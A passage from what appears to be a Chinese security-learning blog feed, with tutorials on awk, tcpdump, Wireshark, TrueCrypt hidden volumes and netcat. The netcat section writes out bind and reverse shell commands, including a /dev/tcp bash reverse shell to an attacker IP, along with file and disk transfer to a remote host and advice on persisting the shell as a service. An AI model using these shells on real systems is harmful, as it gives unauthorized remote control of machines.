class="string">'&#123;ips[$1]++&#125; END&#123;for(i in ips)&#123;print i, ips[i]&#125;&#125;'</span> |sort -k2 -rn | head</span><br><span class="line"></span><br><span class="line">awk <span class="string">'/22/\Mar\/2019/&#123;ips[$1]++&#125; END&#123;for(i in ips)&#123;print i, ips[i]&#125;&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &gt;100的才打印（此方法有点low，可用下面的几种方法）</span></span><br><span class="line">awk <span class="string">'/22/\Mar\/2019/&#123;ips[$1]++&#125; END&#123;for(i in ips)&#123;print i, ips[i]&#125;&#125;'</span> | awk <span class="string">'$2&gt;100'</span> |sort -k2 -rn | head  </span><br><span class="line"></span><br><span class="line">awk <span class="string">'/22/\Mar\/2019/&#123;ips[$1]++&#125; END&#123;for(i in ips)&#123;if(ips[i]&gt;100)&#123;print i, ips[i]&#125;&#125;&#125;'</span> | </span><br><span class="line"><span class="comment"># &gt;100的才打印</span></span><br><span class="line">awk <span class="string">'$2&gt;100'</span> |sort -k2 -rn | head  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#【思路】 将要统计的字段作为数组的索引</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### awk函数</span></span><br><span class="line"><span class="comment"># 统计用户名为4个字符的用户</span></span><br><span class="line">awk -F: <span class="string">'$1~/^....$/&#123;count++;print $1&#125; END&#123;print "count is:" count&#125;'</span> /etc/passwd</span><br><span class="line"><span class="comment"># length</span></span><br><span class="line">awk -F: <span class="string">'length($1)==4&#123;count++;print $1&#125; END&#123;print "count is:" count&#125;'</span> /etc/passwd </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### awk自定义变量(外部变量)</span></span><br><span class="line"><span class="comment"># 1.再双引号里面</span></span><br><span class="line">var=bash</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"unix script"</span> |awk <span class="string">"gsub(/unix/, \"<span class="variable">$var</span>\")"</span>   <span class="comment"># 转义双引号，里面是$变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.两个双引号里面套个单引号</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"unix script"</span> |awk <span class="string">'gsub(/unix/, "'</span><span class="string">"<span class="variable">$var</span>\"'"</span>)<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string">df -h |awk '</span>&#123; <span class="keyword">if</span>(int(<span class="variable">$5</span>)&gt;10)&#123;<span class="built_in">print</span> <span class="variable">$6</span><span class="string">":"</span><span class="variable">$5</span>&#125; &#125;<span class="string">'</span></span><br><span class="line"><span class="string"># 再函数外面单引号情况下</span></span><br><span class="line"><span class="string">i=10</span></span><br><span class="line"><span class="string">df -h |awk '</span>&#123; <span class="keyword">if</span>(int(<span class="variable">$5</span>)&gt;<span class="string">''</span><span class="string">'$i'</span><span class="string">''</span>)&#123;<span class="built_in">print</span> <span class="variable">$6</span><span class="string">":"</span><span class="variable">$5</span>&#125; &#125;<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 3.建议： -v</span></span><br><span class="line"><span class="string">awk -v user=root -F:'</span><span class="variable">$1</span> == user<span class="string">' /etc/passwd  # 在-v的时候定义变量user=root</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">var=bash</span></span><br><span class="line"><span class="string">echo "unix script" |awk "gsub(/unix/, var)" </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 前面造一条命令，传给bash执行</span></span><br><span class="line"><span class="string">arp -n |awk '</span>/^[0-9]/&#123;<span class="built_in">print</span> <span class="string">"arp -d <span class="variable">$1</span>"</span>&#125;<span class="string">' |bash</span></span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>实践中再写…..</p><h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p>其他参考文章：</p><p><a href="https://blog.csdn.net/u011436427/article/details/103815680" target="_blank" rel="noopener">https://blog.csdn.net/u011436427/article/details/103815680</a></p><p><a href="https://mp.weixin.qq.com/s/dXLlFgQS_3KHm8YRyDC7ZQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dXLlFgQS_3KHm8YRyDC7ZQ</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/shell脚本基本知识/title.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
      <category term="Shell" scheme="http://www.xpshuai.cn/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>工具 - tcpdump使用&amp;过程文档记录</title>
    <link href="http://www.xpshuai.cn/%E5%B7%A5%E5%85%B7-tcpdump%E4%BD%BF%E7%94%A8&amp;%E8%BF%87%E7%A8%8B%E6%96%87%E6%A1%A3%E8%AE%B0%E5%BD%95/"/>
    <id>http://www.xpshuai.cn/工具-tcpdump使用&amp;过程文档记录/</id>
    <published>2020-03-15T10:50:35.000Z</published>
    <updated>2020-03-15T10:51:13.102Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工具-tcpdump使用"><a href="#工具-tcpdump使用" class="headerlink" title="工具-tcpdump使用"></a><font color="red">工具-tcpdump使用</font></h1><ul><li><p>No_GUI的抓包分析工具</p></li><li><p>Linux、Unix系统默认安装</p></li></ul><h6 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h6><p>默认只抓68个字节<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#参数:  -i网卡    -s 抓包大小   -w保存到文件</span></span><br><span class="line">tcpdump -i ens33 -s 0 -w file.pcap</span><br><span class="line"></span><br><span class="line"><span class="comment">#抓取指定端口的流量</span></span><br><span class="line">tcpdump -i ens33 port 22</span><br></pre></td></tr></table></figure></p><h6 id="读取抓包文件"><a href="#读取抓包文件" class="headerlink" title="读取抓包文件"></a>读取抓包文件</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看保存到文件中的数据包</span></span><br><span class="line">tcpdump -r file.pcap</span><br><span class="line"><span class="comment">#参数： -A 以ascii码形式显示内容</span></span><br><span class="line">tcpdump -A -r file.pcap</span><br><span class="line"><span class="comment">#参数： -X 以16进制形式显示内容</span></span><br><span class="line">tcpdump -X -r file.pcap</span><br></pre></td></tr></table></figure><h6 id="显示筛选器"><a href="#显示筛选器" class="headerlink" title="显示筛选器"></a>显示筛选器</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#利用OS自带的管道</span></span><br><span class="line"><span class="comment">#参数： -n 以ip地址显示，不显示域名；   显示第三列(ip+端口)并去重</span></span><br><span class="line">tcpdump -n -r file.pcap | awk <span class="string">'&#123;print $3&#125;'</span> | sort -u</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcpdump自身的显示筛选： 只显示源地址为这个的</span></span><br><span class="line">tcpdump -n -src host 192.168.0.1 -r file.pcap</span><br><span class="line"><span class="comment">#只显示目的地址为这个的</span></span><br><span class="line">tcpdump -n -dst host 192.168.0.130 -r file.pcap</span><br><span class="line"><span class="comment">#按端口号筛选</span></span><br><span class="line">tcpdump -n port 53 -r file.pcap</span><br><span class="line"><span class="comment">#显示udp的53端口</span></span><br><span class="line">tcpdump -n udp port 53 -r file.pcap</span><br><span class="line"><span class="comment">#显示tcp的</span></span><br><span class="line">tcpdump -n tcp port 80 -r file.pcap</span><br><span class="line"><span class="comment">#显示icmp的</span></span><br><span class="line">tcpdump -n icmp -r file.pcap</span><br><span class="line"><span class="comment">#显示ip的</span></span><br><span class="line">tcpdump -n ip -r file.pcap</span><br><span class="line"><span class="comment">#-X以16进制显示</span></span><br><span class="line">tcpdump -nX port 80 -r file.pcap</span><br></pre></td></tr></table></figure><h6 id="高级筛选"><a href="#高级筛选" class="headerlink" title="高级筛选"></a>高级筛选</h6><p>TCP的包头：<br><img src="/工具-tcpdump使用&过程文档记录/20200315180543581_5798.png" alt><br>可以看到上图中Flag中的标志位<br>tcpdump可以对如此细致的东西进行筛选  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#只显示第13号字节中值转换为10进制为24(push+ack)的数据包</span></span><br><span class="line">tcpdump -A -n <span class="string">'tcp[13]24'</span> -r file.cap</span><br></pre></td></tr></table></figure><blockquote><p>PS:  nc、Wireshark、tcpdump必须非常熟练地掌握</p></blockquote><h1 id="过程文档记录工具"><a href="#过程文档记录工具" class="headerlink" title="过程文档记录工具 "></a><font color="red">过程文档记录工具 </font></h1><p>介绍几个kali中自带的</p><h6 id="1-Dradis"><a href="#1-Dradis" class="headerlink" title="1.Dradis"></a>1.Dradis</h6><p>基于web的工具</p><ul><li>短期临时小团队资源共享</li><li>各种插件导入文件（兼容很多种扫描器日志的导入）</li></ul><p><strong>使用：</strong><br>webapp<br>初始化后，输入密码即可登录<br>导入导出(支持不同文件格式)扫描器日志<br>（具体自己操作一下就知道了）</p><h6 id="2-Keepnote"><a href="#2-Keepnote" class="headerlink" title="2.Keepnote"></a>2.Keepnote</h6><p>层级化记录信息：<br>不同项目可以使用不同文件夹，子文件<br>可以导出</p><h6 id="3-Truecrypt"><a href="#3-Truecrypt" class="headerlink" title="3.Truecrypt"></a>3.Truecrypt</h6><p>一款<code>加密工具</code><br>2014年停止更新（官方原因是安全性不够，但实际使用却依然较安全）</p><p><strong>选择加密区域：</strong><br>1.创建加密文件（create volume）<br>2.创建卷(全盘加密)  </p><p><strong>选择加密方式</strong><br>1.标准加密卷：<br>2.隐藏加密卷： 若被人强迫输入加密密码，可以输入一个密码打开后什么都没有(outer volume), 而重要信息存在一块隐藏空间(hidden volume)里面。hidden volume大小不能超过outer volume。【首先指定外部卷(迷惑别人的)的大小(尽量大一些,包括内部卷的大小)和密码, 内部机密卷存在于外部卷的空间中(设置它的大小和密码)】</p><p>选择加密算法（也可以多种加密算法叠加用）<br>设置密码<br>指定卷格式<br>生成随机key(用鼠标再屏幕上乱滑,划得月乱，key越复杂)</p><p><strong>使用：</strong><br>选择挂载的文件，就像挂载一块硬盘分区一样<br>使用完成后：<code>dismount</code>或<code>dismount all</code>就行</p><p>对于隐藏加密卷: 输入外部卷的密码就是外部卷的内容(存储大小也隐藏了另一部分)，输入内部卷的密码打开的就是内部卷的内容</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;工具-tcpdump使用&quot;&gt;&lt;a href=&quot;#工具-tcpdump使用&quot; class=&quot;headerlink&quot; title=&quot;工具-tcpdump使用&quot;&gt;&lt;/a&gt;&lt;font color=&quot;red&quot;&gt;工具-tcpdump使用&lt;/font&gt;&lt;/h1&gt;&lt;ul&gt;
&lt;li
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="tcpdump" scheme="http://www.xpshuai.cn/tags/tcpdump/"/>
    
  </entry>
  
  <entry>
    <title>工具 - Wireshark使用</title>
    <link href="http://www.xpshuai.cn/%E5%B7%A5%E5%85%B7-Wireshark%E4%BD%BF%E7%94%A8/"/>
    <id>http://www.xpshuai.cn/工具-Wireshark使用/</id>
    <published>2020-03-15T07:50:21.000Z</published>
    <updated>2020-03-15T08:01:24.454Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/工具-Wireshark使用/title.png"></p><a id="more"></a><h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>抓包嗅探协议分析</li><li>安全专家必备技能</li><li>抓包引擎(wireshark本身是分析数据包, 抓包靠下面两个引擎)<ul><li>Linux上： Libpcap</li><li>Windows上： Winpcap</li></ul></li><li>解码能力（衡量抓包软件好坏的重要标准）</li></ul><h2 id="基本使用方法"><a href="#基本使用方法" class="headerlink" title="基本使用方法"></a>基本使用方法</h2><h6 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h6><h6 id="捕获-gt-选项-gt-…-…"><a href="#捕获-gt-选项-gt-…-…" class="headerlink" title="捕获-&gt;选项-&gt; … …"></a>捕获-&gt;选项-&gt; … …</h6><p><strong>选择抓包网卡</strong><br><img src="/工具-Wireshark使用/20200314214656188_15241.png" alt></p><p><strong>混杂模式</strong><br>勾选上之后，如果数据包不是发送给我指定这个网卡的，也会被抓取</p><p><strong>抓包筛选器</strong><br>指定抓什么包，不抓什么包</p><h6 id="实时抓包"><a href="#实时抓包" class="headerlink" title="实时抓包"></a>实时抓包</h6><p>就是主界面</p><h6 id="保存和分析捕获文件"><a href="#保存和分析捕获文件" class="headerlink" title="保存和分析捕获文件"></a>保存和分析捕获文件</h6><p>先停止，再保存(可以选择格式, 尽量使用<code>.pcap</code>格式)，压缩等, 下次可以导入已经抓取的数据包文件</p><h6 id="首选项"><a href="#首选项" class="headerlink" title="首选项"></a>首选项</h6><p>编辑-&gt;首选项   -&gt; 可以自己根据需要修改和定制界面布局<br><img src="/工具-Wireshark使用/20200314215811593_19130.png" alt><br><img src="/工具-Wireshark使用/20200314215743991_3733.png" alt></p><h4 id="筛选器"><a href="#筛选器" class="headerlink" title="筛选器"></a>筛选器</h4><ul><li>过滤干扰的数据包</li><li>抓包筛选器(捕获, 选项里面那个)</li><li>显示筛选器(主界面那个, 更多使用)    – 常用语法</li></ul><p>可以单独选择，也可以叠加(and, or)上面的条件进行筛选：<br><img src="/工具-Wireshark使用/20200314220435486_29854.png" alt><br><img src="/工具-Wireshark使用/20200314220819061_8554.png" alt></p><h2 id="常见协议数据包"><a href="#常见协议数据包" class="headerlink" title="常见协议数据包"></a>常见协议数据包</h2><p>数据包的分层结构显示</p><h6 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a><font color="red">ARP</font></h6><p><img src="/工具-Wireshark使用/20200315135242728_2582.png" alt><br><img src="/工具-Wireshark使用/20200315135851907_10980.png" alt></p><h6 id="IP"><a href="#IP" class="headerlink" title=" IP"></a><font color="red"> IP</font></h6><p><strong>Protocol字段：</strong> 表示上层是： udp–&gt; 17， tcp–&gt; 6, icmp –&gt;2, igmp –&gt;2<br>四层有好多中协议对应不同的数字<br>Header checksum字段：校验和, 每两位进行异或<br><img src="/工具-Wireshark使用/20200315141145151_10461.png" alt><br>tcp和udp一般不会有<code>option</code>字段（视情况而定）</p><h6 id="TCP"><a href="#TCP" class="headerlink" title=" TCP"></a><font color="red"> TCP</font></h6><p><img src="/工具-Wireshark使用/20200315141900321_8252.png" alt><br><img src="/工具-Wireshark使用/20200315142047940_28399.png" alt></p><p><strong>附：</strong><br>三次握手<br><img src="/工具-Wireshark使用/20200315142429852_2643.png" alt></p><p>四次挥手<br><img src="/工具-Wireshark使用/20200315142522647_28638.png" alt></p><h6 id="UDP"><a href="#UDP" class="headerlink" title=" UDP "></a><font color="red"> UDP </font></h6><p>udp和tcp的类似，自己实践能看懂<br>udp开销更小<br><img src="/工具-Wireshark使用/20200315142800334_28041.png" alt></p><h6 id="DNS"><a href="#DNS" class="headerlink" title=" DNS "></a><font color="red"> DNS </font></h6><p>应用层协议，基于udp<br><img src="/工具-Wireshark使用/20200315143306840_10579.png" alt></p><h6 id="HTTP"><a href="#HTTP" class="headerlink" title=" HTTP "></a><font color="red"> HTTP </font></h6><p><img src="/工具-Wireshark使用/20200315143952274_22660.png" alt><br><img src="/工具-Wireshark使用/20200315144406111_24695.png" alt></p><h6 id="ftp"><a href="#ftp" class="headerlink" title=" ftp "></a><font color="red"> ftp </font></h6><p>这里没ftp服务器就先不放图了<br>ftp也是一个应用层协议</p><blockquote><p>wishark默认是用端口区分协议(假设我们手动把http不开在80端口，wireshark分不清非标准端口的, 需要我们手动修改.如下图.)</p></blockquote><p><img src="/工具-Wireshark使用/20200315144657089_4217.png" alt></p><h4 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h4><p>比如访问一个网页, 往往产生很多数据包<br>wireshark提供了<code>数据流</code></p><ul><li>http</li><li>smtp</li><li>pop3</li><li>ssl 等</li></ul><p><strong>操作(以http为例)：</strong><br><img src="/工具-Wireshark使用/20200315145059801_20372.png" alt><br>按照上图操作完后，会来到数据流的界面，如下：<br><img src="/工具-Wireshark使用/20200315145205546_28877.png" alt></p><h2 id="信息统计"><a href="#信息统计" class="headerlink" title="信息统计"></a>信息统计</h2><p><strong>1.查看导入数据包文件摘要信息</strong><br>导入数据包文件，打开“统计”-&gt;“文件属性”：可以看到一些摘要性的信息</p><p><strong>2.节点数</strong><br>打开“统计”-&gt;“endpoint”： 可以以ip地址区分/udp有多少/二层的包头/其他标准区分 节点的个数等<br>Tx表示发送, Rx表示接收的数据包</p><p><strong>3.协议分布</strong><br>打开“统计”-&gt;“协议分级”：可以看到每个协议里面什么协议的占用百分比(DNS流量占用一般都很小,否则很有可能出现异常)</p><p><strong>4.包大小分布</strong><br>打开“统计”-&gt;“分组长度”：可以看到大包多还是小包多</p><p><strong>5.会话连接</strong><br>打开“统计”-&gt;“conversations”：可以看到哪两台机器之间数据包会话传送最多啥的</p><p><strong>6.解码方式</strong><br>对于非默认端口的数据包，wiresharl只会按端口区分的<br>右键, 手动decode为指定的协议， 这样wireshark就会按正确的协议来解析</p><blockquote><p>需要熟悉不同协议数据包的内容, 防止手动解析错误</p></blockquote><p><strong>7.专家系统</strong><br>“分析” -&gt; “专家系统”:  可能自动给我们一些提示</p><blockquote><p>思路：如果很多个数据包，先从统计信息入手，分析出重点，找出方向。然后筛选出来，逐步分析包的内容</p></blockquote><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><ul><li>抓包对比nc、ncta加密与不加密的流量</li><li>企业抓包部署方案  (Wiershark也有不足，大型网络还是需要商业化的软件)<ul><li>Sniffer</li><li>Cace / riverbed （大部分还是基于wireshark进行了二次开发，改名了应该, 如果需要去网上找吧）</li><li>Cascad pilot</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/工具-Wireshark使用/title.png&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Wireshark" scheme="http://www.xpshuai.cn/tags/Wireshark/"/>
    
  </entry>
  
  <entry>
    <title>工具 - netcat使用</title>
    <link href="http://www.xpshuai.cn/%E5%B7%A5%E5%85%B7-netcat%E4%BD%BF%E7%94%A8/"/>
    <id>http://www.xpshuai.cn/工具-netcat使用/</id>
    <published>2020-03-15T07:35:40.000Z</published>
    <updated>2020-03-15T07:54:31.934Z</updated>
    
    <content type="html"><![CDATA[<h1 id="netcat使用"><a href="#netcat使用" class="headerlink" title="netcat使用"></a>netcat使用</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>侦听模式/传输模式</li><li>可以替代telent  / 获取banner信息</li><li>传输文本信息</li><li>传输文件/目录</li><li>加密传输文件</li><li>远程控制/木马</li><li>加密所有流量</li><li>流媒体服务器</li><li>远程克隆硬盘</li></ul><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h4 id="1-实现telnet-banner"><a href="#1-实现telnet-banner" class="headerlink" title="1. 实现telnet / banner"></a><font color="red">1. 实现telnet / banner</font></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 题外话:追踪路由</span></span><br><span class="line">mtr 114.114.114.114 </span><br><span class="line"></span><br><span class="line"><span class="comment">## nc作为客户端：</span></span><br><span class="line"><span class="comment"># 参数 -v  显示详细信息 </span></span><br><span class="line"><span class="comment"># 参数  -n  如果是域名,不进行域名解析(建议直接跟ip地址)</span></span><br><span class="line">nc -nv 1.1.1.1 110   <span class="comment"># 连接pop3服务器，可以看到banner信息（可以进行user登录[base64编码],输入指令）</span></span><br><span class="line">nc -nv 1.1.1.1 25    <span class="comment"># smtp服务器</span></span><br><span class="line">nc -nv 1.1.1.1 80    <span class="comment"># 探测80端口(都可进行交互的命令)</span></span><br></pre></td></tr></table></figure><h4 id="2-传输文本信息"><a href="#2-传输文本信息" class="headerlink" title="2.传输文本信息"></a><font color="red">2.传输文本信息</font></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以做聊天用</span></span><br><span class="line"><span class="comment"># 一台作为服务端    -l 监听, -p 端口</span></span><br><span class="line">nc -l -p 4444</span><br><span class="line"><span class="comment"># 另一台作为客户端去连接服务端</span></span><br><span class="line">nc -nv 1.1.1.1 4444</span><br></pre></td></tr></table></figure><p><img src="/工具-netcat使用/20200314183944624_25250.png" alt></p><h6 id="用途："><a href="#用途：" class="headerlink" title="用途："></a>用途：</h6><p><strong>远程电子取证</strong> (原则:尽可能少修改被审计系统的状态，避免影响证据)<br>就可以用<code>nc</code>来操作:<br>我的电脑: <code>nc -l -p 3333</code>  监听<br>被审计系统:<code>ls -l | nc -nv 1.1.1.1 3333</code> 输出到我的电脑</p><p>我的电脑: <code>nc -l -p 3333 &gt; ps.txt</code>   输出结果重定向到文件<br>被审计系统:<code>ps -ef | nc -nv 1.1.1.1 3333 -q 1</code>    参数-q: 输出完成之后过1秒就断开</p><p>题外话：<code>lsof</code> 查看已经打开的文件</p><h4 id="3-传输文件-目录"><a href="#3-传输文件-目录" class="headerlink" title="3.传输文件/目录"></a><font color="red">3.传输文件/目录</font></h4><h6 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 客户端向服务端传输  （正向） </span></span><br><span class="line">A： nc-lp 3333 &gt; 1.mp4</span><br><span class="line">B:  nc -nv 1.1.1.1 3333 &lt; 1.mp4 -q 1</span><br><span class="line"><span class="comment"># 或者, 服务端向客户端传输文件  （反向）</span></span><br><span class="line">A:  nc -q 1 -lp 3333 &lt; a.mp4</span><br><span class="line">B:  nc -nv 1.1.1.1 3333 &gt; 2.mp4</span><br></pre></td></tr></table></figure><h6 id="传输目录"><a href="#传输目录" class="headerlink" title="传输目录"></a>传输目录</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正向(服务端先打包再传给客户端,注意小横线别遗漏)</span></span><br><span class="line">A:  tar -cvf - music/ | nc -lp 3333 -q 1</span><br><span class="line">B:  nc -nv 1.1.1.1 3333 | tar -xvf -     <span class="comment"># 先接收再解包</span></span><br></pre></td></tr></table></figure><h6 id="加密传文件"><a href="#加密传文件" class="headerlink" title="加密传文件"></a>加密传文件</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A： nc -lp 3333 | mcrypt --flush -Fbqd -a rijndael-256-m ecb &gt; 1.mp4     <span class="comment"># 接收，解密</span></span><br><span class="line">B： mcrypt --fulsh -Fbq -a rijndael-256-m ecb &lt; a.mp4 | nc 1.1.1.1 3333 -q 1   <span class="comment"># 加密，传送</span></span><br><span class="line"><span class="comment"># 需要输入加密秘钥，解密秘钥</span></span><br><span class="line"><span class="comment"># 不是nc的加密功能，是操作系统的加密命令，可以自行安装</span></span><br></pre></td></tr></table></figure><h4 id="4-流媒体"><a href="#4-流媒体" class="headerlink" title="4.流媒体"></a><font color="red">4.流媒体</font></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#把视频流输出到B端</span></span><br><span class="line">A:  cat 1.mp4 | nc -lp 3333</span><br><span class="line">B:  nc -nv 1.1.1.1 3333 | mplayer -vo x11 -cache 3000 -</span><br><span class="line"><span class="comment">#接收视频流，输出给指定播放器和缓存进行播放</span></span><br></pre></td></tr></table></figure><h4 id="5-端口扫描"><a href="#5-端口扫描" class="headerlink" title="5.端口扫描"></a><font color="red">5.端口扫描</font></h4><blockquote><p>以客户端角色<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#并非擅长端口扫描</span></span><br><span class="line"><span class="comment">#参数 -z 扫描参数，只判断是否开放（默认tcp）</span></span><br><span class="line">nc -nvz 1.1.1.1 1-65535</span><br><span class="line"><span class="comment">#参数 -u  扫描udp服务的端口 （不太准确）</span></span><br><span class="line">nc -nvzu 1.1.1.1 1-1024</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="6-远程克隆硬盘"><a href="#6-远程克隆硬盘" class="headerlink" title="6.远程克隆硬盘"></a><font color="red">6.远程克隆硬盘</font></h4><p><strong>远程电子取证</strong>，可以将目标服务器硬盘远程复制(<code>块</code>级别的备份,<code>磁盘磁道的状态原原本本的复制</code>)，或者内存(内存中运行的病毒进程)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:  nc -lp 3333 | dd of=/dev/sda</span><br><span class="line">B:  dd -<span class="keyword">if</span>=/dev/sda | nc -nv 1.1.1.1 3333 -q 1</span><br></pre></td></tr></table></figure></p><h4 id="7-远程控制"><a href="#7-远程控制" class="headerlink" title="7.远程控制"></a><font color="red">7.远程控制</font></h4><p>参数: -c<br><strong>正向：</strong>   目标机器作为服务端监听, 把bash传给我<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:  nc -lp 3333 -c bash   <span class="comment">#目标机器</span></span><br><span class="line">B:  nc 1.1.1.1 3333</span><br></pre></td></tr></table></figure></p><p><strong>反向：</strong>    我的机器作为服务端, 让目标机器作为客户端主动连接我(客户端把bash传给服务器端)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A:  nc -lvp 3333       </span><br><span class="line">B:  nc 1.1.1.1 3333 -c bash    <span class="comment">#目标机器</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#假如nc不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell</span></span><br><span class="line">目标机器： bash -i &gt;&amp; /dev/tcp/192.168.41.133/2223 0&gt;&amp;1</span><br><span class="line">攻击方： nc -lvvp 2223</span><br></pre></td></tr></table></figure></p><blockquote><p>Note: Windows用户把bash改为cmd</p></blockquote><blockquote><p>反向连接用的多， 因为好多都限制进入的流量而不太多限制出去的流量(根据他允许的端口调整,比如dns)</p></blockquote><blockquote><p>长久维持会话： 写成脚本作为系统服务，让目标机器已启动就连接我</p></blockquote><h2 id="ncat-命令"><a href="#ncat-命令" class="headerlink" title="ncat 命令"></a>ncat 命令</h2><p><font color="red"> <strong>nc缺陷：</strong></font></p><ul><li>nc缺乏加密能力：是数据是明文传输（容易被别人嗅探）</li><li>缺乏身份验证能力：端口如果一直向外开放，容易被他人连接窃取当做肉鸡</li><li>不同系统/平台的nc参数功能不尽相同（自己 -h 查看帮助文档和测试）</li></ul><p><font color="red"> <strong>ncat 命令</strong></font><br>是包含在nmap工具包中里面的一个东西(弥补了nc缺乏加密和身份验证的不足)</p><p>正向连接：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先进行了秘钥交换和加密</span></span><br><span class="line"><span class="comment">#被控端(服务器端)   -allow允许连接的ip， 端口, 